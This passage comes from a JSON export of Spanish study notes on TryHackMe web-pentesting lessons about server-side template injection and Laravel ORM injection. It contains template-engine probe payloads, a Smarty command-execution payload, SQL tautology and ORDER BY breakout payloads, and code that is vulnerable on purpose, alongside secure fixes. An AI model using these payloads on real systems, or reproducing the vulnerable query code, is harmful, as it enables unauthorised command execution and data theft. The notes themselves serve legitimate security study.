la m√°quina vulnerable, si usas el payload `{{7*7}}` en Twig obtendr√°s `49`.\n\n![[Pasted image 20260112191155.png]]\n\nSin embargo, si usas el mismo payload en Jinja2, el output ser√° `7777777`.\n\n![[Pasted image 20260112191228.png]]\n<h4>Jade/Pug</h4>\nPug, antes conocido como Jade, usa una sintaxis diferente para manejar expresiones, lo que puede ser explotado para identificar su uso. Pug/Jade eval√∫a las expresiones JavaScript en `#{}`. Por ejemplo, al usar el payload `#{7*7}` devolver√° `49`.\n\n![[Pasted image 20260112191341.png]]\n\nAl contrario que Jinja2 o Twig, Pug/Jade directamente permiten la ejecuci√≥n de JavaScript en sus plantillas sin necesidad de delimitadores adicionales como `{{}}`. Por ejemplo:\n\n![[Pasted image 20260112191441.png]]",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "2. SSTI Overview",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/2-ssti-overview/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/2. SSTI Overview.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "<h2>¬øQu√© es SSTI?</h2>\nLa Server-Side Template Injection (SSTI) es una vulnerabilidad que ocurre cuando el input se incorpora de manera insegura en la plantilla del lado del servidor, permitiendo a los atacantes inyectar y ejecutar c√≥digo en el servidor. Los motores de plantillas se suelen usar en aplicaciones web para generar HTML din√°mico combinando plantillas fijas con datos din√°micos. Cuando estos motores procesan el input del usuario sin sanitizaci√≥n adecuada, se vuelven susceptibles a ataques SSTI.\n\n<h4>Conceptos Clave de SSTI</h4>\n- **Generaci√≥n de Contenido Din√°mico:** Los motores de plantillas reemplazan los placeholders con datos reales, permitiendo a las aplicaciones generar p√°ginas HTML din√°micas. Este proceso puede ser explotado si no se sanitizan adecuadamente los inputs.\n- **Input del Usuario como C√≥digo de Plantilla:** Cuando se tratan los inputs como parte del c√≥digo de la plantilla, pueden introducir l√≥gica maliciosa en el output renderizado, llevando a SSTI.\n\nEl n√∫cleo de SSTI recae en el manejo indebido del input del usuario en las plantillas del lado del servidor. Los motores de plantillas interpretan y ejecutan expresiones incrustadas para generar contenido din√°mico. Si un atacante puede inyectar payloads maliciosos en estas expresiones, pueden manipular la l√≥gica del lado del servidor y ejecutar c√≥digo arbitrario.\n\n----------------------------------------\n<h2>Flujo de un Ataque SSTI</h2>\n![[Pasted image 20260112181009.png]]\n\nCuando los inputs del usuario se incrustan directamente en las plantillas sin la validaci√≥n o escapado correspondiente, los atacantes pueden construir payloads que alteran el comportamiento de las plantillas. Esto puede llevar a acciones no anticipadas, incluyendo:\n\n- Leer o modificar los archivos del lado del servidor.\n- Ejecutar comandos de sistema.\n- Acceder a informaci√≥n sensible.",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "4. PHP - Smarty",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/4-php-smarty/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/4. PHP - Smarty.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "Smarty es un poderoso motor de plantillas para PHP que habilita a los desarrolladores a separar la presentaci√≥n de la l√≥gica de negocio, mejorando la escalabilidad y el mantenimiento de la aplicaci√≥n. Sin embargo, su capacidad para ejecutar funciones PHP puede exponer las aplicaciones a ataques de inyecci√≥n.\n\nLa flexibilidad de Smarty permite la ejecuci√≥n din√°mica de funciones PHP en sus plantillas, que pueden convertirse en un riesgo de seguridad significativo. La habilidad de ejecutar c√≥digo PHP a trav√©s de variables o modificadores de plantilla  deber√≠a ser controlada cuidadosamente.\n\n------------------------------------------\n<h2>Exploitation</h2>\nAntes de construir el payload debemos confirmar si la aplicaci√≥n realmente usa Smarty. Por ejemplo, vamos a `http://ssti.thm:8000/smarty/`.\n\nInyectamos un tag Smarty como `{'Hello'|upper}` para ver si es procesado. Si la aplicaci√≥n devuelve \"HELLO\" significa que el motor de plantilla usado en la aplicaci√≥n es Smarty.\n\n![[Pasted image 20260112194254.png]]\n\nUna vez confirmado que el sitio es vulnerable a SSTI v√≠a Smarty, podemos construir un payload que use funciones PHP para ejecutar comandos de sistema. Una de las m√°s comunes es `system()`. Usando el payload `{system(\"ls\")}` es una forma directa y efectiva de ver si las configuraciones de seguridad permiten la ejecuci√≥n de PHP.\n\n![[Pasted image 20260112195426.png]]\n\nCuando el motor de plantillas Smarty procesa el input, ejecuta el comando `ls`.",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "1. Redirection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/7-injectics/1-redirection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/7. Injectics/1. Redirection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 7. Injectics",
    "content": "Para ver este curso ve a **THM -> Maquinas/2. Medium -> 8. Injectics -> 1. Getting the Flags**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Injectics",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/7-injectics/0-injectics/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/7. Injectics/0. Injectics.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 7. Injectics",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/0. Injectics]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/7. Injectics/1. Redirection]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. ORM Injection - Vulnerable Implementation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/6-orm-injection-vulnerable-implementation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/6. ORM Injection - Vulnerable Implementation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "Aunque las pr√°cticas de programaci√≥n seguras son esenciales, tambi√©n es importante reconocer c√≥mo un desarrollador puede implementar sin querer una versi√≥n vulnerable de ORM, creando v√≠as para la explotaci√≥n. Ocurre cuando los desarrolladores usan librer√≠as ORM mal configuradas o antiguas. Los desarrolladores deben asegurarse de estar usando versiones actualizadas y seguras de dichas librer√≠as.\n\n----------------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\nUno de estos ejemplos es el paquete de construcci√≥n de queries de Laravel, el cual tuvo una vulnerabilidad de seguridad importante en versiones anteriores a la 1.17.1. Esta vulnerabilidad permit√≠a la inyecci√≥n SQL mediante par√°metros query no sanitizados. La vulnerabilidad fue identificada en c√≥mo manejaba el paquete los par√°metros de b√∫squeda sin validaci√≥n adecuada. Hemos usado el [Spatie query builder](https://github.com/spatie/laravel-query-builder) para este ejemplo, lo que tambi√©n usa el Laravel's query builder internamente.\n\nPara demostrar esta vulnerabilidad puedes acceder a `https://IP.reverse-proxy.cell-prod-us-east-1b.vm.tryhackme.com/query_users?sort=name`. Este endpoint permite recuperar los usuarios de arriba ordenados por la columna `name` v√≠a el par√°metro `sort`.\n\n![[Pasted image 20260116135729.png]]\n\nEl traducci√≥n de query equivalente de Laravel es `SELECT * FROM users ORDER BY name ASC LIMIT 2`.\n\n<h4>Intento de Inyecci√≥n</h4>\nSi intentamos inyectar el par√°metro nombre con `name'`, veremos que la app devuelve un error de que no pudo encontrar el nombre de la columna.\n\n![[Pasted image 20260116142050.png]]\n\nNuestro objetivo aqu√≠ es manipular la query para obtener la informaci√≥n completa de la tabla `users` en lugar de ser restringidos a un n√∫mero de filas.\n\nSin embargo, inyectar el par√°metro sort en este contexto no es tan f√°cil como concatenar el `SELECT` y usar m√©todos de inyecci√≥n rutinarios. El reto yace en romper efectivamente la cl√°usula `ORDER BY` para manipular la ejecuci√≥n. Para conseguir esto, podemos utilizar una funci√≥n especial: el operador `->` el cual sirve como alias de la funci√≥n `json_extract` en MySQL. Este operador nos permite navegar la informaci√≥n JSON y extraer valores espec√≠ficos. Usando el operador `->` en conjunci√≥n con el payload `\"%27))`, podemos romper la cl√°usula `ORDER BY`. El payload `->\"%27))` termina efectivamente la extracci√≥n JSON, bypasseando las limitaciones impuestas por la query inicial y permiti√©ndonos a√±adir comandos SQL adicionales.\n\n<h4>Payload Final</h4>\nPrepararemos el payload final de la siguiente manera:\n\n- **Query Inicial:** La query inicial que Laravel traduce para mostrar a los usuarios pertinentes es `SELECT * FROM users ORDER BY name ASC LIMIT 2`.\n- **Rompiendo la Query:** Inyectando `name->\"%27))`, podemos causar la ruptura de la query para crear una oportunidad de inyectar nuestro propio SQL.\n- **Construyendo el Payload:** Para explotar esta vulnerabilidad, construimos el payload para que rompa la string e inyecte el SQL. El payload deber√≠a ser algo como `name->\"%27)) SQL INJECTION QUERY #`. En el valor de par√°metro `name->`, el operador `->` es parseado por Laravel y reemplazado con la funci√≥n MySQL JSON. Por otro lado, `\"%27))` cierra la string y condici√≥n anteriores. `SQL INJECTION QUERY` permite al atacante escribir su propia query. El car√°cter `#` comenta el resto de la linea.\n- **Resultado Final:** El payload para obtener las filas adicionales de la base de datos ser√≠a `SELECT * FROM 'users' ORDER BY json_unquote(json_extract('name', '$.\"\"')) LIMIT 10#\"')) ASC LIMIT 2`, incluyendo el payload inyectado.\n\n![[Pasted image 20260116143658.png]]",
    "modified": "2026-01-17T00:53:14"
  },
  {
    "title": "3. How ORM Works",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/3-how-orm-works/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/3. How ORM Works.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "<h2>Mapear Entre Objetos en el C√≥digo y Tablas de Bases de Datos</h2>\nORM es una t√©cnica que simplifica la interacci√≥n de informaci√≥n en una aplicaci√≥n mapeando objetos en el c√≥digo a tablas de bases de datos. En PHP, este proceso involucra definir clases que representen tablas de bases de datos y sus relaciones, Cada clase corresponde a una columna en la tabla, y cada instancia de clase representa una fila.\n\nPor ejemplo, usando Laravel's Eloquent ORM, puedes definir una clase modelo as√≠:\n\n```php\nnamespace App\\Models;\nuse Illuminate\\Database\\Eloquent\\Model;\nclass User extends Model\n{\n    protected $table = 'users';\n    protected $fillable = [\n        'name', 'email', 'password',\n    ];\n    // Other Eloquent model configurations can go here...\n}\n```\n\nEn este ejemplo, la clase `User` se mapea a la tabla `user` en la base de datos, con propiedades correspondiendo a las columnas. Eloquent ORM maneja la traducci√≥n entre estas representaciones de objetos y las queries SQL subyacentes, permitiendo a los desarrolladores manipular registros de bases de datos usando sintaxis orientada a objetos.\n\n----------------------------------------\n<h2>Operaciones ORM Comunes (Create, Read, Update, Delete)</h2>\nLas operaciones comunes de bases de datos en frameworks ORM, com√∫nmente conocidas como CRUD:\n\n- **Create:** Crear nuevos registros en la base de datos involucra instanciar un nuevo objeto modelo, configurando sus propiedades y guard√°ndolo en la base da datos.\n  \n```php\nuse App\\Models\\User;\n\n// Create a new user\n$user = new User();\n$user->name = 'Admin';\n$user->email = 'admin@example.com';\n$user->password = bcrypt('password'); \n$user->save();\n```\n  \n  Este c√≥digo crea un nuevo usuario y lo guarda en la base de datos. El m√©todo de guardado prepara la entidad para su inserci√≥n y ejecuta el statement SQL INSERT para a√±adir un nuevo registro en la tabla users. La funci√≥n `bcrypt()` es usada para hashear de forma segura la contrase√±a antes de guardarla.\n- **Read:** Leer los registros de la base de datos involucra recuperar informaci√≥n usando varios m√©todos de Eloquent.\n  \n```php\nuse App\\Models\\User;\n\n// Find a user by ID\n$user = User::find(1);\n\n// Find all users\n$allUsers = User::all();\n\n// Find users by specific criteria\n$admins = User::where('email', 'admin@example.com')->get();\n```\n  \n  Este c√≥digo demuestra formas diferentes de recuperar registros de la base de datos. La funci√≥n `find(1)` recupera el usuario con ID 1 ejecutando el statement SQL SELECT. La funci√≥n `all()` recupera todos los usuarios ejecutando `SELECT * FROM users`. La cl√°usula `where('email', 'admin@example.com')->get()` recupera los usuarios con el email especificado ejecutando `SELECT * FROM users WHERE emai = 'admin@example.com'`.\n\nDe forma similar a las operaciones create y read, las funcionalidades delete y update siguen un enfoque similar. Para actualizaciones recuperas el registro existente, lo modificas y guardas los cambios. Para borrados recuperas el registro y llamas al m√©todo delete para eliminarlo de la base de datos. \n\n------------------------------------------------\n<h2>Comparando la Inyecci√≥n SQL y ORM</h2>\nLa inyecci√≥n SQL y ORM son ambas t√©cnicas usada para explotar vulnerabilidades en las interacciones de las bases de datos, pero tienen como objetivos diferentes niveles del stack:\n\n- **SQL Injection:** Apunta a queries SQL, permitiendo a los atacantes manipular statements SQL directamente. Esto se consigue inyectando input malicioso en la string query. La parte de inyecci√≥n en la siguiente query, `OR '1'='1`, siempre eval√∫a en true.\n\n```php\nSELECT * FROM users WHERE username = 'admin' OR '1'='1';\n```\n\n- **ORM Injection:** Apunta al framework ORM explotando c√≥mo se construyen las queries desde las operaciones de objetos. Los atacantes manipulan los m√©todos ORM y propiedades para influenciar las queries SQL resultantes.\n  \n ```php\n $userRepository->findBy(['username' => \"admin' OR '1'='1\"]);\n ```\n  \n  En el c√≥digo de arriba, la parte de la inyecci√≥n, `admin' OR '1'='1`, siempre se eval√∫a en true.\n\n------------------------------------------\n<h2>Diferencias Clave en T√©cnicas de Explotaci√≥n</h2>\n\n| **Aspecto**        | **SQL Injection  <br>**                                                   | **ORM Injection**                                                                                                              |\n| ------------------ | ------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |\n| Nivel de Inyecci√≥n | Apunta a queries SQL raw directamente                                     | Apunta a la construcci√≥n de queries del framework ORM                                                                          |\n| Complejidad        | M√°s directo ya que manipula SQL                                           | Requiere entendimiento de c√≥mo funcionan los m√©todos internos de ORM                                                           |\n| Detecci√≥n          | M√°s f√°cil de detectar con WAFs tradicionales y registros query            | M√°s dif√≠cil detectar ya que los payloads est√°n en m√©todos ORM                                                                  |\n| Mitigaci√≥n         | Uso de statements preparados, queries parametrizadas, validaci√≥n de input | Configuraci√≥n ORM correcta, validaci√≥n de input a nivel de aplicaci√≥n, funcionalidades ORM reforzando la seguridad de la query |\n\n----------------------------------------------\n<h2>Configurando el Entorno</h2>\nYa que estamos usando Laravel para este proyecto, explicaremos brevemente c√≥mo configurar Eloquent ORM (Laravel-Based). Eloquent ORM es el ORM por defecto de Laravel, que ofrece una implementaci√≥n de `Active Record` simple y bonita para trabajar con tu base de datos. Primero, debemos instalar Laravel usando Composer. Abre tu terminal y ejecuta el comando `composer create-project --prefer-dist laravel/laravel thm-project`, donde `thm-project` es el nombre del proyecto. No necesitas hacer estos pasos, es s√≥lo para ayudarte a entender c√≥mo funciona.\n\n<h4>Configurar las Credenciales de la Base de Datos</h4>\nDespu√©s necesitamos configurar nuestras credenciales. Laravel usa el archivo `.env` para almacenar las variables de entorno, incluyendo credenciales. Abre el archivo `.env` en la ra√≠z de tu proyecto Laravel y actualiza las siguientes l√≠neas con los detalles de tu base de datos.\n\n```php\nDB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=your_database_name\nDB_USERNAME=your_database_user\nDB_PASSWORD=your_database_password\n```\n\n<h4>Configurar Migraciones</h4>\nLas migraciones son el control de versiones de tu base de datos, permiti√©ndote modificar y compartir f√°cilmente el esquema de la base de datos. El sistema de migraci√≥n de Laravel es una parte esencial del framework y simplifica el manejo de los cambios en la base de datos.\n\n<h4>Crear una Migraci√≥n</h4>\nPara crear una migraci√≥n, podemos usar el comando `Artisan` que viene con Laravel. Puedes ejecutar el comando `php artisan make:migration create_users_table --create=users` para generar una migraci√≥n para la tabla `users`.\n\nEste comando genera un archivo de migraci√≥n en el directorio de base de datos/migraci√≥n. El archivo de migraci√≥n contiene m√©todos para definir la estructura de la tabla `users`.\n\n```php\n<?php\nuse Illuminate\\Database\\Migrations\\Migration;\nuse Illuminate\\Database\\Schema\\Blueprint;\nuse Illuminate\\Support\\Facades\\Schema;\nclass CreateUsersTable extends Migration\n{\n    public function up()\n    {\n        Schema::create('users', function (Blueprint $table) {\n            $table->id();\n            $table->string('name');\n            $table->string('email')->unique();\n            $table->string('password');\n            $table->timestamps();\n        });\n    }\n    public function down()\n    {\n        Schema::dropIfExists('users');\n    }\n}\n```\n\nEn el c√≥digo de arriba, el m√©todo `up()` define la estructura de la tabla `users`. Por el contrario, `down()` dropea la tabla `users` si se revierte la migraci√≥n.\n\nDespu√©s de definir la migraci√≥n, ejecuta el comando `php artisan migrate` para aplicar la migraci√≥n y crear la tabla `users` en la base de datos. Este comando ejecutar√° `up()` en el archivo de migraci√≥n y crear√° la tabla `users` con las columnas especificadas en la base de datos.\n\nEn el contexto de ORM, las migraciones simplifican el proceso de mapear las tablas de la base de datos para modelos de aplicaci√≥n. Sin embargo, desde el punto de vista de un red teamer, migraciones mal configuradas pueden llevar a vulnerabilidades como ORM injection.",
    "modified": "2026-01-16T00:55:48"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "Con los avances en ciber seguridad, muchos desarrolladores han adoptado un object-relational mapping (ORM) para mitigar los ataques de inyecci√≥n SQL. Aqunque ORM pretende simplificar las interacciones de las bases de datos y mejorar la seguridad, la amenaza de los ataques de inyecci√≥n no ha acabado. ORM Injection ocurre cuando los atacantes explotan vilnerabilidades en frameworks ORM, permiti√©ndoles ejecutar queries arbitrarias. Exploraremos t√©cnicas de inyecci√≥n ORM avanzadas.\n\n----------------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nA lo largo de esta unidad ganar√°s un entendimiento profundo de los siguientes conceptos:\n\n- ORM\n- Identificar inyecciones\n- Implementaci√≥n d√©bil\n- Implementaci√≥n vulnerable\n\n---------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/0. SQL Injection]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]",
    "modified": "2026-01-16T00:55:48"
  },
  {
    "title": "5. ORM Injection - Weak Implementation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/5-orm-injection-weak-implementation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/5. ORM Injection - Weak Implementation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "En esta tarea exploraremos c√≥mo un atacante puede explotar vulnerabilidades ORM cuando este est√° implementado d√©bilmente. Primero visitamos el sitio web.\n\n![[Pasted image 20260116122434.png]]\n\nTomemos un momento para ver el c√≥digo fuente usado por el desarrollador para el campo **Email (Vulnerable)**:\n\n```php\npublic function searchBlindVulnerable(Request $request)\n{\n    $users = [];\n    $email = $request->input('email');\n    $users = Admins::whereRaw(\"email = '$email'\")->get();\n    if ($users) {\n        return view('user', ['users' => $users]);\n    } else {\n        return view('user', ['message' => 'User not found']);\n    }\n}\n```\n\n----------------------------------------------\n<h2>Lo que Hace esta Funci√≥n</h2>\nLa funci√≥n `search BlindVulnerable()` est√° dise√±ada para recuperar registros de usuarios basad en el par√°metro email dado por el usuario. Aqu√≠ est√° un desglose detallado de la funci√≥n:\n\n- **Recuperar Input:** La funci√≥n captura el par√°metro `email` de la petici√≥n HTTP. Esto se hace con el m√©todo input del objeto `$request`.\n- **Construir Query:** La funci√≥n construye la query SQL usando el m√©todo de Laravel `whereRaw()` el cual directamente incorpora el valor email en la query SQL.\n- **Ejecutar Query:** Se ejecuta la query y se guarda el valor en la variable `$users`.\n- **Devolver Vista:** Finalmente, la funci√≥n devuelve una vista. Si el array `$users` no est√° vac√≠o, pasa la informaci√≥n del usuario a la vista, en otro caso pasa \"**User not Found**\".\n\nEl problema principal en esta funci√≥n yace en el uso directo de `whereRaw()` con el input del usuario. Este m√©todo de construcci√≥n de queries es vulnerable a la inyecci√≥n porque no sanitiza el input.\n\nUn atacante puede explotar esta vulnerabilidad manipulando el par√°metro email. Si un atacante introduce `1' OR '1'='1`, la query resultante se vuelve:\n\n```sql\nSELECT * FROM users WHERE email = '1' OR '1'='1';\n```\n\nEsta query siempre devuelve todos los registros de usuarios porque la condici√≥n `'1'='1'` siempre es true.\n\n----------------------------------------------------\n<h2>Explotaci√≥n Detallada</h2>\n- **Introducir Valor Malicioso:** El atacante introduce un payload en el campo vulnerable, por ejemplo `1' OR '1'='1'`.\n- **Construir la Query:** La funci√≥n `searchBlindVulnerable()` recupera este input y construye la siguiente query:\n\n```php\n$users = User::whereRaw(\"email = '1' OR '1'='1'\")->get();\n```\n\n- **Ejecutar la Query:** Eloquent ORM de Laravel transforma esto en un statement SQL: `SELECT * FROM users WHERE email = '1' OR '1'='1';`.\n- **Resultado:** Como `'1'='1'` siempre es true, la query devuelve todos los registros en la tabla users.\n  ![[Pasted image 20260116125611.png]]\n\n-------------------------------------------------\n<h2>Implementar Queries ORM Seguras</h2>\nEchemos un vistazo a la versi√≥n segura de la funci√≥n para demostrar c√≥mo la implementaci√≥n segura puede proteger contra las vulnerabilidades de inyecci√≥n ORM. Usando queries parametrizadas podemos asegurarnos de que el input del usuario est√© debidamente sanitizado, reduciendo significativamente el riesgo de ataques de inyecci√≥n. Aqu√≠ una implementaci√≥n segura de la funci√≥n v√≠a **Email (Secure)**:\n\n```php\npublic function searchBlindSecure(Request $request)\n{\n    $email = $request->input('email');\n    $users = User::where('email', $email)->get();\n    if (isset($users) && count($users) > 0) {\n        return view('user', ['users' => $users]);\n    } else {\n        return view('user', ['message' => 'User not found']);\n    }\n}\n```\n\n---------------------------------------\n<h2>Desglose de Implementaci√≥n Segura</h2>\n- **Recuperar el Input:** La funci√≥n captura el par√°metro email de la petici√≥n HTTP usando el m√©todo input del objeto `$request`.\n- **Construir la Query de Forma Segura:** En lugar de usar `whereRaw()`, usamos la versi√≥n segura, `where()`. Este m√©todo autom√°ticamente escapa el input previniendo la SQLi.\n- **Ejecutar la Query:** Se ejecuta la query y se guarda el resultado en la variable `$users`. Debido a que la query est√° parametrizada, el input est√° sanitizado por lo que no puede romper la estructura SQL.\n- **Devolver la Vista:** Finalmente la funci√≥n devuelve una vista. Si el array `$users` contiene informaci√≥n, pasa al usuario la informaci√≥n a ver. Si no, muestra un mensaje de error.\n\nSi ahora intentamos usar la misma query en el input seguro, obtendremos lo siguiente:\n\n![[Pasted image 20260116131829.png]]\n\n-----------------------------------------\n<h2>Por qu√© es Esto Seguro</h2>\n- **Queries Parametrizadas:** Las queries parametrizadas se aseguran de que los valores del input sean tratados s√≥lo como datos, no c√≥digo ejecutable.\n- **Escape Autom√°tico:** Eloquent escapa autom√°ticamente los valores introducidos.\n- **L√≥gica de Query Consistente:** Usando m√©todos de Eloquent como `where()` la l√≥gica de la query se mantiene clara y consistente.",
    "modified": "2026-01-17T00:53:14"
  },
  {
    "title": "7. Best Practices",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/7-best-practices/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/7. Best Practices.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "Ahora que entendemos la superficie de ataque de la inyecci√≥n ORM, prevenir estas vulnerabilidades requiere implementar medidas de seguridad robustas y monitorizar continuamente debilidades potenciales.\n\n--------------------------------------\n<h2>Algunas Pr√°cticas Importantes</h2>\n- **Validaci√≥n de Input:** Valida siempre el input del usuario del lado del cliente y del lado del servidor. Aseg√∫rate de que la informaci√≥n introducida cumple con formato, tipo y longitud.\n- **Queries Parametrizadas:** Usa queries parametrizadas (prepared statements) para interactuar con la base de datos.\n- **Uso de ORM:** Utiliza las herramientas integradas del ORM para interactuar con la base de datos. \n- **Escapado y Sanitizaci√≥n:** Escapa y sanitiza siempre el input del usuario para eliminar caracteres especiales e informaci√≥n maliciosa.\n- **Lista de Inputs Permitidos:** Implementa un alista para la validaci√≥n de inputs. Permite s√≥lo espec√≠ficos (whitelist).\n\n------------------------------------------\n<h2>Aplicaci√≥n en Frameworks Populares</h2>\nExploraremos pr√°cticas esenciales para salvaguardarnos de la inyecci√≥n ORM en frameworks ORM populares. Herramientas ORM como Doctrine (PHP), SQLAlchemy (Python), Hibernate (Java) y Entity Framework (.NET) ofrecen abstracciones poderosas para interactuar con bases de datos. Sin embargo, para prevenir vulnerabilidades de inyecci√≥n SQL, es crucial emplear pr√°cticas de programaci√≥n segura.\n\n<h4>Doctrine (PHP)</h4>\nUsa statements preparados con queries parametrizadas para prevenir los ataques de inyecci√≥n SQL.\n\n```php\n$query = $entityManager->createQuery('SELECT u FROM User u WHERE u.username = :username');\n$query->setParameter('username', $username);\n$users = $query->getResult();\n```\n\n<h4>SQLAlchemy (Python)</h4>\nUsa el ORM de SQLAlchemy y Query API para usar queries parametrizadas, que escapan autom√°ticamente.\n\n```python\nfrom sqlalchemy.orm import sessionmaker\nSession = sessionmaker(bind=engine)\nsession = Session()\nuser = session.query(User).filter_by(username=username).first()\n```\n\n<h4>Hibernate</h4>\nUsa par√°metros nombrados con la Query API de Hibernate para asegurar que los inputs sean correctamente escapados.\n\n```java\nString hql = \"FROM User WHERE username = :username\";\nQuery query = session.createQuery(hql);\nquery.setParameter(\"username\", username);\nList results = query.list();\n```\n\n<h4>Entity Framework (.NET)</h4>\nEmplea queries parametrizadas en el Entity Framework para securizar las interacciones de la base de datos y mitiga el riesgo de vulnerabilidades de inyecci√≥n SQL.\n\n```C#\nvar user = context.Users.FirstOrDefault(u => u.Username == username);\n```",
    "modified": "2026-01-17T00:53:14"
  },
  {
    "title": "2. Understanding ORM",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/2-understanding-orm/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/2. Understanding ORM.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "<h2>¬øQu√© es ORM?</h2>\nORM es una t√©cnica de programaci√≥n que facilita la conversi√≥n de informaci√≥n entre sistemas incompatibles usando lenguajes de programaci√≥n orientados a objetos. Permite a los desarrolladores interactuar con la base de datos usando la sintaxis nativa del lenguaje de programaci√≥n haciendo la manipulaci√≥n de informaci√≥n m√°s intuitiva y reduciendo la necesidad de queries SQL extensas. ORM es particularmente beneficioso cuando se requieren interacciones de informaci√≥n complejas, ya que simplifica el aceso a la base de datos y promueve al reutilizaci√≥n de c√≥digo.\n\n![[Pasted image 20260115123955.png]]\n\n----------------------------------------------\n<h2>Prop√≥sito</h2>\nORM sirve como un puente entre el modelo de programaci√≥n orientado a objetos y el modelo de base de datos relacional. El prop√≥sito principal de un ORM es abstraer la capa de base de datos, permitiendo a los desarrolladores trabajar con objetos en lugar de tablas y filas. Esta capa de abstracci√≥n ayuda en:\n\n- **Reducir el C√≥digo Boilerplate:** ORM reduce la necesidad de c√≥digo repetitivo generando autom√°ticamente queries SQL basadas en operaciones con objetos.\n- **Incrementar Productividad:** Los desarrolladores pueden centrarse en la l√≥gica de negocio sin preocuparse por las interacciones de la base de datos.\n- **Asegurar Consistencia:** Los frameworks ORM manejan consistentemente las operaciones de la base de datos reduciendo el riesgo de errores.\n- **Mejorar el Mantenimiento:** Los cambios al esquema de la base de datos son m√°s f√°ciles de manejar, ya que pueden ser reflejados en el modelo del objeto sin modificaciones de c√≥digo excesivas.\n\n-----------------------------------------------\n<h2>Frameworks ORM Com√∫nmente Usados</h2>\nVarios frameworks son ampliamente usados en la comunidad de desarrollo, cada uno refiri√©ndose a diferentes lenguajes de programaci√≥n y entornos. Aqu√≠ hay algunos ejemplos:\n\n<h4>Doctrine (PHP)</h4>\nDoctrine es un framework ORM poderoso y flexible para PHP. Es particularmente popular en el framework Symfony pero puede ser usado independientemente. Doctrine ofrece un conjunto de herramientas para interacciones con las bases de datos. Su habilidad de mapear estructuras complejas en esquemas de bases de datos lo hace el favorito de los desarrolladores PHP.\n<h4>Hibernate (Java)</h4>\nEs un framework ORM maduro y 